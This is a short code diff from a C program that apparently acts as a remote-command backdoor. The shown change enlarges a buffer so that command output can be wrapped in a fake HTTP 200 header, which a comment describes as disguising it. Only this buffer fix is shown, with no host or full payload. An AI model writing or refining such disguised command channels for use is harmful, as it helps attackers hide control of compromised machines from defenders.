@@ -175,7 +175,7 @@ int main(void) {
                 commandOutput[len + 1] = '\0';
 
                 // Disguise the command output in an HTTP Header
-                char message[100] = "HTTP/1.1 200 OK\r\nContent-Length: ";
+                char message[8292] = "HTTP/1.1 200 OK\r\nContent-Length: ";
                 char messageSize[6];
                 sprintf_s(messageSize, "%d", (int)strnlen(commandOutput, 8190));
                 strncat_s(message, messageSize, 6);
